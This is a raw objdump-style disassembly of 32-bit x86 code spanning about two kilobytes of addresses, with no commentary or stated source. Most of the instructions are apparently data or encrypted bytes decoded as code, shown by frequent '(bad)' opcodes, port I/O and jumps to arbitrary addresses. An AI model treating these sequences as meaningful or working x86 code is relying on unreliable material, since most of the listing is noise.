  4167bc:	and    BYTE PTR [ebx+0x95b9095],bh
  4167c2:	loope  0x416789
  4167c4:	sub    DWORD PTR [edx-0x7d],esi
  4167c7:	xlat   BYTE PTR ds:[ebx]
  4167c8:	retf   0x24fd
  4167cb:	out    dx,eax
  4167cc:	fcmovu st,st(5)
  4167ce:	test   al,0x46
  4167d0:	fsubr  DWORD PTR [edi+eax*4-0x58]
  4167d4:	sar    DWORD PTR [esi+eax*4],cl
  4167d7:	idiv   BYTE PTR [edi-0x4a3c8bd0]
  4167dd:	idiv   DWORD PTR [edx-0x166c339e]
  4167e3:	in     al,0x90
  4167e5:	cmp    bl,BYTE PTR [ecx+0x66b10866]
  4167eb:	fst    st(1)
  4167ed:	cdq    
  4167ee:	sbb    BYTE PTR [esp+esi*4],bl
  4167f1:	inc    esp
  4167f2:	enter  0x78f6,0xf0
  4167f6:	mov    eax,0x3153039f
  4167fb:	popa   
  4167fc:	fst    QWORD PTR [edi+ebp*8-0x29548c5a]
  416803:	sub    edx,ecx
  416805:	clc    
  416806:	shl    BYTE PTR [ebp-0x6],1
  416809:	push   es
  41680a:	addr16 stc 
  41680c:	mov    ecx,0x5edd9037
  416811:	add    ecx,esi
  416813:	sub    al,bl
  416815:	jle    0x416862
  416817:	xor    ch,dh
  416819:	mov    WORD PTR [eax-0x3bd457c4],cs
  41681f:	add    eax,0xce3cde46
  416824:	addr16 pop ebx
  416826:	push   esi
  416827:	aas    
  416828:	gs cdq 
  41682a:	es dec edi
  41682c:	popa   
  41682d:	dec    esp
  41682e:	push   ebp
  41682f:	push   ss
  416830:	dec    esi
  416831:	xchg   esp,eax
  416832:	pop    esp
  416833:	pop    edx
  416834:	push   cs
  416835:	loopne 0x41689e
  416837:	sbb    eax,0xc61bf312
  41683c:	push   esp
  41683d:	jo     0x4168bd
  41683f:	sbb    DWORD PTR [edi+0x65],edx
  416842:	jle    0x41686c
  416844:	dec    esp
  416845:	clc    
  416846:	push   edx
  416847:	ins    BYTE PTR es:[edi],dx
  416848:	cmp    al,0x14
  41684a:	cs je  0x416847
  41684d:	or     DWORD PTR [edi+0x7fb9b79],0xaf4c1b48
  416857:	and    al,0xe7
  416859:	or     ebx,DWORD PTR [ecx+esi*4+0x1d0befa5]
  416860:	inc    edi
  416861:	cmp    BYTE PTR [edx-0x2e],dh
  416864:	pop    esi
  416865:	add    eax,0x3cc2b442
  41686a:	add    ecx,DWORD PTR [esi-0x4f]
  41686d:	push   ebp
  41686e:	sbb    al,0x98
  416870:	pop    es
  416871:	rcl    bl,0x29
  416874:	std    
  416875:	xor    BYTE PTR ds:0x4dca19c,dl
  41687b:	xchg   esp,eax
  41687c:	xchg   esi,eax
  41687d:	pop    esp
  41687e:	test   BYTE PTR ds:0xb798c3e,dh
  416884:	dec    eax
  416885:	loop   0x4168cf
  416887:	jo     0x4168ac
  416889:	retf   0x85da
  41688c:	sbb    eax,0xbe1b7486
  416891:	sub    dl,BYTE PTR [ecx+eax*2]
  416894:	in     al,0x66
  416896:	jne    0x41685a
  416898:	outs   dx,DWORD PTR ds:[esi]
  416899:	mov    al,ds:0x9a038713
  41689e:	push   edx
  41689f:	mov    DWORD PTR [ecx-0xcb726eb],0x86f5b306
  4168a9:	or     eax,0xf5645d6f
  4168ae:	adc    ah,BYTE PTR [ecx-0xd]
  4168b1:	add    al,0x12
  4168b3:	(bad)  
  4168b4:	pop    esp
  4168b5:	mov    dh,0xfb
  4168b7:	inc    ecx
  4168b8:	repnz and BYTE PTR [ebx-0x16],dl
  4168bc:	rcr    DWORD PTR [esi-0x50503bfd],1
  4168c2:	cld    
  4168c3:	lds    ebp,FWORD PTR [ebx-0x3a311689]
  4168c9:	mov    bh,0x91
  4168cb:	(bad)  
  4168cc:	out    dx,al
  4168cd:	scas   al,BYTE PTR es:[edi]
  4168ce:	pop    ss
  4168cf:	mov    DWORD PTR [eax+0x237a7baf],eax
  4168d5:	mov    edi,0x59b19577
  4168da:	sar    BYTE PTR [edx-0x21e0e75c],cl
  4168e0:	sub    eax,0xf39a86cc
  4168e5:	dec    esi
  4168e6:	sbb    esi,ecx
  4168e8:	call   0x92bf:0xa7c0a58c
  4168ef:	jnp    0x41688a
  4168f1:	lahf   
  4168f2:	mov    esp,0x99861e44
  4168f7:	add    DWORD PTR [ecx],esi
  4168f9:	es scas al,BYTE PTR es:[edi]
  4168fb:	add    cl,ah
  4168fd:	hlt    
  4168fe:	arpl   WORD PTR [edi],sp
  416900:	or     eax,DWORD PTR [ebp+0x4fccfe9]
  416906:	mov    esp,DWORD PTR [eax+0x2e]
  416909:	xchg   ecx,eax
  41690a:	mov    esi,0xac6f2835
  41690f:	adc    edx,edx
  416911:	sbb    DWORD PTR [ebp-0x4c],ecx
  416914:	adc    al,0x4
  416916:	sti    
  416917:	scas   al,BYTE PTR es:[edi]
  416918:	daa    
  416919:	jmp    0x4168ba
  41691b:	pop    ecx
  41691c:	in     al,dx
  41691d:	push   esi
  41691e:	lods   eax,DWORD PTR ds:[esi]
  41691f:	pusha  
  416920:	push   ecx
  416921:	dec    edx
  416922:	lods   al,BYTE PTR ds:[esi]
  416923:	imul   ah
  416925:	add    DWORD PTR ds:0x2323db0c,esi
  41692b:	and    al,0xd3
  41692d:	(bad)  
  41692e:	int    0xcc
  416930:	repnz not DWORD PTR [eax]
  416933:	mov    eax,0x3774c06d
  416938:	lds    esi,FWORD PTR es:[ecx+0x3534a0ea]
  41693f:	adc    BYTE PTR [esi],0xbb
  416942:	jns    0x41693f
  416944:	jb     0x41698a
  416946:	jmp    0xe0f0c725
  41694b:	inc    ebx
  41694c:	sar    edi,0xb8
  41694f:	dec    esp
  416950:	mov    esp,0x6b690dff
  416955:	and    eax,0x49b1c925
  41695a:	xor    DWORD PTR [edi-0x1293ef46],ebx
  416960:	scas   eax,DWORD PTR es:[edi]
  416961:	pop    ebp
  416962:	ds js  0x41696b
  416965:	jg     0x4169c3
  416967:	xchg   edi,eax
  416968:	mov    ds:0x62d1e635,eax
  41696d:	mov    esp,0x7d2e9632
  416972:	arpl   bp,cx
  416974:	xchg   esp,eax
  416975:	push   eax
  416976:	adc    bl,BYTE PTR [ecx+0x4b58539e]
  41697c:	jg     0x416966
  41697e:	xchg   esi,eax
  41697f:	outs   dx,BYTE PTR ds:[esi]
  416980:	scas   eax,DWORD PTR es:[edi]
  416981:	(bad)  
  416982:	out    0xdb,eax
  416984:	repz adc DWORD PTR [edi-0x3b],esi
  416988:	in     al,dx
  416989:	or     DWORD PTR [ecx],esp
  41698b:	fwait
  41698c:	enter  0xc352,0xc5
  416990:	jmp    0x682c8291
  416995:	int3   
  416996:	xlat   BYTE PTR ds:[ebx]
  416997:	lods   al,BYTE PTR ds:[esi]
  416998:	or     DWORD PTR [edx+esi*4+0x2594442f],0xa9935382
  4169a3:	jmp    0x7a878b92
  4169a8:	addr16 in eax,0x88
  4169ab:	inc    esi
  4169ac:	nop
  4169ad:	sub    eax,0xae2db829
  4169b2:	(bad)  [ebx+esi*8-0x22]
  4169b6:	jg     0x416a01
  4169b8:	dec    ebx
  4169b9:	mov    ecx,0x42577d16
  4169be:	sar    BYTE PTR [edi],0x6
  4169c1:	inc    edi
  4169c2:	(bad)  
  4169c3:	mov    edi,0xdf2fe10e
  4169c8:	add    DWORD PTR [esi],esp
  4169ca:	xchg   esp,eax
  4169cb:	pop    eax
  4169cc:	call   0xffe1984e
  4169d1:	neg    BYTE PTR [ecx+0xd78d6be]
  4169d7:	addr16 pop es
  4169d9:	sbb    BYTE PTR [ebp+0x39191c64],bh
  4169df:	pop    ecx
  4169e0:	fbld   TBYTE PTR [ebx]
  4169e2:	iret   
  4169e3:	dec    edx
  4169e4:	inc    esp
  4169e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e7:	imul   esp,DWORD PTR [eax-0x5715b763],0x29
  4169ee:	fisub  WORD PTR [eax+eax*8-0x53984da6]
  4169f5:	cmp    eax,0x4e8ed666
  4169fa:	dec    edx
  4169fb:	clc    
  4169fc:	std    
  4169fd:	and    ebp,0xffffffbc
  416a00:	pop    esi
  416a01:	xchg   bl,al
  416a03:	mov    WORD PTR [ecx-0x68],?
  416a06:	jno    0x416a32
  416a08:	and    DWORD PTR [edx+ebp*8],ebx
  416a0b:	std    
  416a0c:	ficom  DWORD PTR [edx-0x50]
  416a0f:	adc    al,0x8
  416a11:	cwde   
  416a12:	in     eax,0xab
  416a14:	sbb    dh,dl
  416a16:	xor    edi,DWORD PTR [eax-0x3d]
  416a19:	push   edx
  416a1a:	mov    bh,0xd3
  416a1c:	xchg   ebp,eax
  416a1d:	in     eax,0x13
  416a1f:	push   eax
  416a20:	dec    eax
  416a21:	jae    0x4169db
  416a23:	nop
  416a24:	mov    BYTE PTR [eax],bl
  416a26:	scas   eax,DWORD PTR es:[edi]
  416a27:	mov    ecx,0x29d927fd
  416a2c:	xor    BYTE PTR ds:0xeaca43fc,dl
  416a32:	add    eax,0xc028ba85
  416a37:	call   0x616:0xa53ad674
  416a3e:	mov    WORD PTR [eax-0x47],es
  416a41:	sub    DWORD PTR [ebx],0xe0aafba3
  416a47:	rol    BYTE PTR [ebp-0x36],0x66
  416a4b:	xchg   ebx,eax
  416a4c:	les    esi,FWORD PTR [edx+esi*4+0x55]
  416a50:	leave  
  416a51:	pop    esp
  416a52:	xor    BYTE PTR [edi+edi*4-0x14ea54ad],0x21
  416a5a:	(bad)  
  416a5b:	in     al,0xca
  416a5d:	sahf   
  416a5e:	push   edx
  416a5f:	push   DWORD PTR [ecx+esi*2-0x4784f44c]
  416a66:	xchg   ebp,eax
  416a67:	imul   ecx,DWORD PTR [esi],0xfffffff8
  416a6a:	jnp    0x416a1c
  416a6c:	in     al,dx
  416a6d:	mov    es,esp
  416a6f:	mov    dl,0xa1
  416a71:	cmp    BYTE PTR [ebx],dh
  416a73:	push   esp
  416a74:	mov    ecx,DWORD PTR [ebp+0x8]
  416a77:	mov    edx,0xfa5e15e2
  416a7c:	sub    edx,ecx
  416a7e:	add    edx,DWORD PTR [ebp-0x44]
  416a81:	mov    DWORD PTR [ebp-0x44],edx
  416a84:	mov    ecx,DWORD PTR [ebp+0x8]
  416a87:	xor    ecx,eax
  416a89:	add    ecx,esi
  416a8b:	jmp    0x418e4a
  416a90:	(bad)  
  416a91:	clc    
  416a92:	fsub   st,st(6)
  416a94:	mov    ah,0xc6
  416a96:	mov    ah,0xe8
  416a98:	mov    cl,0x4b
  416a9a:	cmp    DWORD PTR [edx+edx*2-0x299c4adb],edi
  416aa1:	push   edi
  416aa2:	jns    0x416b1e
  416aa4:	fcomp  DWORD PTR [edi+0x7a]
  416aa7:	jp     0x416b28
  416aa9:	jae    0x416a3b
  416aab:	push   esp
  416aac:	fistp  WORD PTR [edx-0x3ccb803f]
  416ab2:	push   ebx
  416ab3:	push   ebx
  416ab4:	mov    dh,0x25
  416ab6:	in     al,0xf8
  416ab8:	cs imul ebx,eax,0xd1ed57ea
  416abf:	dec    ebp
  416ac0:	jne    0x416adb
  416ac2:	push   ss
  416ac3:	aaa    
  416ac4:	or     BYTE PTR [ebx],dl
  416ac6:	pop    ecx
  416ac7:	xor    ah,BYTE PTR [edx+0x2a]
  416aca:	ja     0x416b39
  416acc:	in     al,0xfc
  416ace:	cs push edx
  416ad0:	mov    ebp,0xa96532c4
  416ad5:	outs   dx,DWORD PTR ds:[esi]
  416ad6:	cmp    BYTE PTR [edx-0x5714166d],ah
  416adc:	imul   eax,DWORD PTR [ebx-0x5f],0x16be0d90
  416ae3:	bound  edx,QWORD PTR [eax+0x4d]
  416ae6:	leave  
  416ae7:	lods   al,BYTE PTR ds:[esi]
  416ae8:	jae    0x416af4
  416aea:	add    BYTE PTR [ecx],al
  416aec:	inc    ecx
  416aed:	sbb    al,0x62
  416aef:	adc    cl,BYTE PTR [ebx+0x37]
  416af2:	and    ch,ah
  416af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416af5:	je     0x416ae3
  416af7:	pop    esp
  416af8:	sbb    BYTE PTR [esi+ebp*1-0x6fd25f6e],bh
  416aff:	cdq    
  416b00:	or     ecx,DWORD PTR [edx-0x48daebe6]
  416b06:	into   
  416b07:	xchg   ecx,eax
  416b08:	enter  0x5752,0x2d
  416b0c:	scas   al,BYTE PTR es:[edi]
  416b0d:	mov    dh,0x38
  416b0f:	add    cl,bh
  416b11:	fcom   QWORD PTR [ebp+0x75]
  416b14:	xor    al,0xe9
  416b16:	(bad)  
  416b17:	fnstsw WORD PTR [edx]
  416b19:	or     BYTE PTR [esi*8+0x37840ccd],dl
  416b20:	sub    eax,0x1925033b
  416b25:	out    0xf2,eax
  416b27:	repnz sbb al,BYTE PTR [eax+0x1c1f67d3]
  416b2e:	iret   
  416b2f:	mov    esi,0xc6cef8d9
  416b34:	lahf   
  416b35:	fsubr  DWORD PTR [ebx+0x6ec17b4f]
  416b3b:	scas   al,BYTE PTR es:[edi]
  416b3c:	dec    esi
  416b3d:	push   esp
  416b3e:	sub    al,ch
  416b40:	xor    BYTE PTR [ebp+0x6a],0x15
  416b44:	outs   dx,DWORD PTR ds:[esi]
  416b45:	mov    dh,cl
  416b47:	cs adc eax,0x59181acb
  416b4d:	xor    esi,DWORD PTR [edx+0x3f]
  416b50:	xchg   edx,eax
  416b51:	iret   
  416b52:	sbb    eax,0xeaee63e1
  416b57:	fbstp  TBYTE PTR [eax+0x2daadbc1]
  416b5d:	enter  0xbdaa,0xb
  416b61:	aam    0x59
  416b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b64:	push   edx
  416b65:	dec    edi
  416b66:	pushf  
  416b67:	addr16 loope 0x416b4b
  416b6a:	push   es
  416b6b:	jnp    0x416b2b
  416b6d:	daa    
  416b6e:	test   BYTE PTR [ebx],bl
  416b70:	outs   dx,BYTE PTR ds:[esi]
  416b71:	aam    0xd6
  416b73:	mov    ecx,0x7d4a908d
  416b78:	jecxz  0x416bed
  416b7a:	test   al,0x9b
  416b7c:	fnstcw WORD PTR [esi+0x27]
  416b7f:	or     DWORD PTR [ecx-0x59],edx
  416b82:	or     BYTE PTR [edi+edx*2-0x1f],dl
  416b86:	lea    ebx,[eax-0x12]
  416b89:	pop    edx
  416b8a:	jmp    0x416b70
  416b8c:	pushf  
  416b8d:	push   ebp
  416b8e:	mov    al,0x9b
  416b90:	icebp  
  416b91:	jae    0x416c00
  416b93:	jns    0x416b6f
  416b95:	push   ebx
  416b96:	test   DWORD PTR [edi-0x21],0xc5fdc9b
  416b9d:	mov    ecx,0x556ff6f5
  416ba2:	xchg   ebx,eax
  416ba3:	fs mov bh,0x97
  416ba6:	cdq    
  416ba7:	and    dl,cl
  416ba9:	in     al,dx
  416baa:	xchg   edi,eax
  416bab:	mov    bl,BYTE PTR [eax]
  416bad:	shl    DWORD PTR [eax],0x8e
  416bb0:	mov    cl,0xc5
  416bb2:	outs   dx,BYTE PTR ds:[esi]
  416bb3:	imul   ebp,esi,0x7b
  416bb6:	ss dec ebx
  416bb8:	jae    0x416c25
  416bba:	push   esp
  416bbb:	scas   eax,DWORD PTR es:[edi]
  416bbc:	shl    DWORD PTR [ebp-0x247447ee],cl
  416bc2:	fdivr  QWORD PTR [ecx+0x7d577665]
  416bc8:	icebp  
  416bc9:	mov    ds:0x5bf9918,al
  416bce:	arpl   cx,sp
  416bd0:	mov    cl,BYTE PTR [ebx-0x22afdba2]
  416bd6:	stos   DWORD PTR es:[edi],eax
  416bd7:	pop    ebp
  416bd8:	cs sbb ch,bh
  416bdb:	xor    ecx,edi
  416bdd:	push   esp
  416bde:	inc    edx
  416bdf:	mov    eax,ds:0x554e28ad
  416be4:	pusha  
  416be5:	psraw  mm0,QWORD PTR [esi-0x1a0ad08d]
  416bec:	dec    esi
  416bed:	pop    ecx
  416bee:	mov    esp,0xe828e999
  416bf3:	je     0x416c07
  416bf5:	push   es
  416bf6:	test   BYTE PTR ds:0xd9f19b28,ah
  416bfc:	or     ebx,DWORD PTR [ebx-0xdcc5c1e]
  416c02:	jno    0x416bbb
  416c04:	mov    esi,edi
  416c06:	mov    esi,0xf65e4ef1
  416c0b:	cmp    BYTE PTR [ecx],0x46
  416c0e:	popf   
  416c0f:	leave  
  416c10:	dec    esp
  416c11:	mov    al,BYTE PTR [edx+esi*2-0x7ee955b2]
  416c18:	shr    BYTE PTR [edi+0x10],0xbf
  416c1c:	pusha  
  416c1d:	dec    eax
  416c1e:	xor    BYTE PTR [ecx-0x119c43d],ah
  416c24:	jmp    0x73937591
  416c29:	out    dx,eax
  416c2a:	les    ebp,FWORD PTR [ebx]
  416c2c:	push   0x222a4c25
  416c31:	repz add DWORD PTR fs:[esi+0xb],ebx
  416c36:	je     0x416c21
  416c38:	cmp    DWORD PTR [edx],0xcec8b01a
  416c3e:	loopne 0x416caa
  416c40:	jg     0x416c03
  416c42:	(bad)  
  416c43:	xchg   ebp,eax
  416c44:	xchg   ecx,eax
  416c45:	mov    esp,0x3e9033a5
  416c4a:	ret    0x8af4
  416c4d:	pushf  
  416c4e:	fcom   DWORD PTR [edi]
  416c50:	push   0x38
  416c52:	sub    eax,0xa3e2f205
  416c57:	inc    ebx
  416c58:	arpl   sp,dx
  416c5a:	dec    esp
  416c5b:	mov    ebx,0x3e09885c
  416c60:	out    dx,eax
  416c61:	xchg   ecx,eax
  416c62:	shr    ah,cl
  416c64:	cmp    eax,edi
  416c66:	mov    al,ds:0x6ab4e320
  416c6b:	jb     0x416cab
  416c6d:	stos   BYTE PTR es:[edi],al
  416c6e:	scas   al,BYTE PTR es:[edi]
  416c6f:	idiv   edi
  416c71:	add    eax,0xe955c8ba
  416c76:	mov    esi,0x70e82cc3
  416c7b:	sub    eax,0xdf9d028f
  416c80:	push   ebp
  416c81:	jne    0x416c12
  416c83:	jb     0x416c34
  416c85:	mov    DWORD PTR [edx],ecx
  416c87:	popf   
  416c88:	sbb    eax,0x13a5574a
  416c8d:	in     eax,dx
  416c8e:	inc    ecx
  416c8f:	jne    0x416cfc
  416c91:	inc    ebp
  416c92:	fdiv   DWORD PTR [ebx+0x7f956e48]
  416c98:	xchg   DWORD PTR [esi-0x5a383673],ebx
  416c9e:	fadd   st(0),st
  416ca0:	enter  0xe7ce,0x0
  416ca4:	mov    ecx,0x1ff41231
  416ca9:	je     0x416cc8
  416cab:	cmp    ecx,DWORD PTR [ecx+0x8af3740]
  416cb1:	push   0x6031969a
  416cb6:	push   edi
  416cb7:	loopne 0x416cd7
  416cb9:	sbb    al,bh
  416cbb:	cs jp  0x416ca8
  416cbe:	clc    
  416cbf:	mov    bl,0x8b
  416cc1:	adc    al,0xab
  416cc3:	fidiv  DWORD PTR [edx+0x49]
  416cc6:	inc    edi
  416cc7:	cmp    BYTE PTR [edx-0x11bff155],bh
  416ccd:	iret   
  416cce:	scas   al,BYTE PTR es:[edi]
  416ccf:	in     eax,0x89
  416cd1:	push   0x92946f8b
  416cd6:	xchg   ecx,eax
  416cd7:	jns    0x416c8f
  416cd9:	ror    BYTE PTR [eax+ebx*8-0x74],0x84
  416cde:	inc    edx
  416cdf:	bound  edx,QWORD PTR [ecx-0x79]
  416ce2:	test   BYTE PTR [ecx-0x41ecd456],bl
  416ce8:	jmp    0x54fec203
  416ced:	sub    ch,bl
  416cef:	repnz leave 
  416cf1:	fnstcw WORD PTR [edx-0x2d419d9e]
  416cf7:	ret    
  416cf8:	lea    eax,[edx+edi*1-0x7da7391c]
  416cff:	cmp    cl,BYTE PTR [edx-0x7564cba1]
  416d05:	and    BYTE PTR [edx+0x1d],ch
  416d08:	imul   BYTE PTR [ecx]
  416d0a:	pop    edi
  416d0b:	and    BYTE PTR [ecx-0x70],0xda
  416d0f:	cmc    
  416d10:	outs   dx,BYTE PTR ds:[esi]
  416d11:	js     0x416d44
  416d13:	in     eax,0x55
  416d15:	cmp    eax,0x3aa52137
  416d1a:	push   edx
  416d1b:	imul   ebx,edi,0xffffffa9
  416d1e:	addr16 and eax,0x6b5bef7f
  416d24:	aam    0x25
  416d26:	test   eax,0xf740a8c
  416d2b:	setns  BYTE PTR [ecx+ebx*2]
  416d2f:	into   
  416d30:	xchg   edi,eax
  416d31:	xchg   esp,eax
  416d32:	mov    BYTE PTR [edi+esi*4],bl
  416d35:	outs   dx,BYTE PTR ds:[esi]
  416d36:	xor    al,BYTE PTR [esi+0x78]
  416d39:	cmp    eax,DWORD PTR [edi]
  416d3b:	in     al,dx
  416d3c:	dec    edx
  416d3d:	pop    ds
  416d3e:	mov    eax,ds:0xb3b2a837
  416d43:	popf   
  416d44:	jg     0x416d4b
  416d46:	fcomip st,st(7)
  416d48:	cmc    
  416d49:	cwde   
  416d4a:	inc    esp
  416d4b:	(bad)  
  416d4c:	xor    BYTE PTR [ebx+0x19],al
  416d4f:	mov    dh,0x45
  416d51:	dec    eax
  416d52:	mov    ebp,esi
  416d54:	fstp   DWORD PTR [ecx+0x26]
  416d57:	into   
  416d58:	es (bad) 
  416d5a:	jmp    0x82daf1bf
  416d5f:	mov    esp,0x64f25782
  416d64:	pusha  
  416d65:	call   0xad268537
  416d6a:	out    dx,eax
  416d6b:	cli    
  416d6c:	fwait
  416d6d:	fwait
  416d6e:	inc    ebx
  416d6f:	sbb    al,BYTE PTR [eax+eiz*1]
  416d72:	fldcw  WORD PTR [esi+0x46]
  416d75:	les    ebp,FWORD PTR [ecx+0x42dd0df4]
  416d7b:	mov    esp,0x4925f8cb
  416d80:	dec    esp
  416d81:	inc    edi
  416d82:	push   ebx
  416d83:	mov    ebp,0x3321c19e
  416d88:	add    DWORD PTR [ebx+0x55e898c0],ebx
  416d8e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416d90:	sbb    DWORD PTR [eax+0x67f57c56],edx
  416d96:	xchg   esp,eax
  416d97:	popf   
  416d98:	push   ss
  416d99:	cmc    
  416d9a:	ret    
  416d9b:	jg     0x416df0
  416d9d:	xchg   edx,eax
  416d9e:	dec    esp
  416d9f:	cmp    al,0xa2
  416da1:	aad    0xd6
  416da3:	xchg   ecx,eax
  416da4:	xor    BYTE PTR [eax],cl
  416da6:	pop    ss
  416da7:	jmp    0x416d47
  416da9:	xchg   esi,eax
  416daa:	je     0x416e26
  416dac:	add    DWORD PTR [esp+esi*8+0x6f3ed025],ebx
  416db3:	cmp    BYTE PTR [edx+0x12261a13],al
  416db9:	add    eax,0x12edf6f6
  416dbe:	push   ss
  416dbf:	adc    DWORD PTR [eax+0x4cdc1f0],esp
  416dc5:	mov    edi,0xa670cb11
  416dca:	cmp    eax,0x53d8acdd
  416dcf:	lods   al,BYTE PTR ds:[esi]
  416dd0:	xor    BYTE PTR [edx+0x31],0xd6
  416dd4:	inc    esi
  416dd5:	outs   dx,BYTE PTR ds:[esi]
  416dd6:	sbb    dh,BYTE PTR [esi]
  416dd8:	or     eax,0x78525136
  416ddd:	add    bh,BYTE PTR [ebx+ebp*8-0x1de17bae]
  416de4:	mov    dl,0x27
  416de6:	daa    
  416de7:	loop   0x416e21
  416de9:	add    DWORD PTR [esi-0x28],ebx
  416dec:	mov    BYTE PTR [ebx-0x10],al
  416def:	ret    0xcc05
  416df2:	leave  
  416df3:	push   ebx
  416df4:	lods   al,BYTE PTR ds:[esi]
  416df5:	sub    eax,0xec186a9f
  416dfa:	cld    
  416dfb:	imul   eax,DWORD PTR [esi],0x3c
  416dfe:	outs   dx,BYTE PTR ds:[esi]
  416dff:	(bad)  
  416e01:	sbb    eax,0x4bf7ffba
  416e06:	jl     0x416db2
  416e08:	aad    0x67
  416e0a:	jbe    0x416e30
  416e0c:	xor    al,0xc9
  416e0e:	stos   DWORD PTR es:[edi],eax
  416e0f:	inc    ebp
  416e10:	les    esp,FWORD PTR [ecx+0x76]
  416e13:	aad    0x30
  416e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e16:	sub    DWORD PTR [eax+ebx*4],esp
  416e19:	sbb    DWORD PTR [ebp-0x4449f0e1],0xffffffe2
  416e20:	ds leave 
  416e22:	lock test al,0xc6
  416e25:	ds stc 
  416e27:	or     ch,0x7c
  416e2a:	push   0xb99a19e
  416e2f:	loop   0x416e53
  416e31:	ja     0x416e2d
  416e33:	add    eax,0x93024f08
  416e38:	dec    eax
  416e39:	xchg   ecx,eax
  416e3a:	dec    ecx
  416e3b:	or     al,0x4c
  416e3d:	rcr    BYTE PTR [ecx],0xef
  416e40:	sbb    eax,0x52bb41bb
  416e45:	sti    
  416e46:	mov    ecx,0xba03bb7b
  416e4b:	lahf   
  416e4c:	bound  edx,QWORD PTR [ebx]
  416e4e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e50:	mov    eax,ds:0x6d5c821e
  416e55:	mov    ebp,0xb50071c5
  416e5a:	xor    ecx,DWORD PTR [edi-0x55]
  416e5d:	or     eax,DWORD PTR [eax+0x20]
  416e60:	jge    0x416e95
  416e62:	cmp    dh,BYTE PTR [ecx+0x5a99e8e5]
  416e68:	mov    bh,0x2a
  416e6a:	in     eax,dx
  416e6b:	aaa    
  416e6c:	loop   0x416e9e
  416e6e:	and    DWORD PTR [ebx+0x531b23a7],0xffffffe6
  416e75:	int    0xab
  416e77:	test   bh,bl
  416e79:	xor    al,0xad
  416e7b:	das    
  416e7c:	daa    
  416e7d:	cmp    eax,0xa29621c7
  416e82:	mov    edi,0xf115bd3f
  416e87:	cmp    ebx,ebx
  416e89:	aaa    
  416e8a:	pop    ecx
  416e8b:	repz mov bl,0x70
  416e8e:	les    ebx,FWORD PTR [eax]
  416e90:	pop    edi
  416e91:	jo     0x416ebf
  416e93:	imul   ebx,edx,0xcfeaf375
  416e99:	mov    al,ds:0x9d1a6b64
  416e9e:	fs sti 
  416ea0:	inc    esi
  416ea1:	mov    ch,0x95
  416ea3:	adc    bl,BYTE PTR es:[edx-0x1d5831ec]
  416eaa:	arpl   cx,ax
  416eac:	add    BYTE PTR [ebp+0x4b1b209f],ah
  416eb2:	in     eax,dx
  416eb3:	push   0x12
  416eb5:	mov    al,ds:0x3ba7a93b
  416eba:	dec    esp
  416ebb:	mov    ah,0xe4
  416ebd:	push   0x4d
  416ebf:	loope  0x416ec0
  416ec1:	xlat   BYTE PTR ds:[ebx]
  416ec2:	dec    eax
  416ec3:	push   ecx
  416ec4:	jecxz  0x416f24
  416ec6:	xor    BYTE PTR [ebx+0x520f4378],0x8a
  416ecd:	test   DWORD PTR [ebx+0xa40a3a0],ecx
  416ed3:	sti    
  416ed4:	fbld   TBYTE PTR [edi-0x77d5ce18]
  416eda:	xchg   ebp,eax
  416edb:	fnstsw WORD PTR [ebx]
  416edd:	iret   
  416ede:	or     ah,0xdc
  416ee1:	add    al,0x5a
  416ee3:	inc    edi
  416ee4:	nop
  416ee5:	mov    edi,0x19929731
  416eea:	push   es
  416eeb:	xchg   ebx,eax
  416eec:	mov    al,ds:0x7b372220
  416ef1:	push   ecx
  416ef2:	dec    esp
  416ef3:	pop    ecx
  416ef4:	fdiv   DWORD PTR [edx+edi*1]
  416ef7:	mov    eax,gs
  416ef9:	cdq    
  416efa:	mov    ch,0x5c
  416efc:	cmp    esi,DWORD PTR [edx+0x43]
  416eff:	in     al,dx
  416f00:	aaa    
  416f01:	sbb    dh,BYTE PTR [edx+ebx*1+0x699fc74c]
  416f08:	repz in eax,dx
  416f0a:	shl    BYTE PTR [eax+eiz*1+0x312c33d3],cl
  416f11:	shr    DWORD PTR [edx+0x3b],1
  416f14:	add    DWORD PTR [edx],ebp
  416f16:	aas    
  416f17:	or     ch,BYTE PTR [ebx-0x8]
  416f1a:	dec    ebx
  416f1b:	lahf   
  416f1c:	pusha  
  416f1d:	cmp    al,ah
  416f1f:	cmp    ecx,DWORD PTR [ecx-0x466b3d79]
  416f25:	hlt    
  416f26:	mov    dh,0x4
  416f28:	mov    DWORD PTR [ebx+0xc67c75],esp
  416f2e:	std    
  416f2f:	and    eax,0x9036e535
  416f34:	sbb    ah,bh
  416f36:	sub    ebp,DWORD PTR [edi+0x34]
  416f39:	jle    0x416f50
  416f3b:	fcmovbe st,st(7)
  416f3d:	mov    ds:0x225d95c8,al
  416f42:	xchg   BYTE PTR [edi],ch
  416f44:	mov    ds:0x34514a9b,eax
  416f49:	lock jge 0x416f51
  416f4c:	pushf  
  416f4d:	(bad)  
  416f4e:	gs int 0x5b
  416f51:	pop    DWORD PTR [esp+edi*8]
  416f54:	fcom   DWORD PTR [ebx-0x13]
  416f57:	jmp    0xfeb396b0
  416f5c:	mov    edx,ebx
  416f5e:	xchg   ebx,eax
  416f5f:	mov    edx,0x665fb52f
  416f64:	inc    eax
  416f65:	ror    BYTE PTR [ebp-0x21],cl
  416f68:	inc    esi
  416f69:	in     eax,dx
  416f6a:	jg     0x416eed
  416f6c:	lods   al,BYTE PTR ds:[esi]
  416f6d:	jmp    0x4f626d84
  416f72:	add    DWORD PTR [ecx+ecx*1-0x79],esp
  416f76:	lods   al,BYTE PTR ds:[esi]
  416f78:	in     al,dx
  416f79:	test   al,0x1
  416f7b:	or     eax,0xb23c393e
  416f80:	sbb    dl,ah
  416f82:	and    BYTE PTR gs:[edx-0x639cafae],bl
  416f89:	sti    
  416f8a:	cwde   
  416f8b:	push   cs
  416f8c:	sti    
  416f8d:	data16 mov al,ds:0x4a347496
  416f93:	jo     0x416f3f
  416f95:	add    al,bh
  416f97:	gs jae 0x416f51
  416f9a:	lods   eax,DWORD PTR ds:[esi]
  416f9b:	(bad)
  416f9e:	mov    bl,0x92
  416fa0:	neg    DWORD PTR ds:0xde0e84aa
  416fa6:	fdiv   QWORD PTR [ebx]
  416fa8:	scas   al,BYTE PTR es:[edi]
  416fa9:	jecxz  0x416f4c
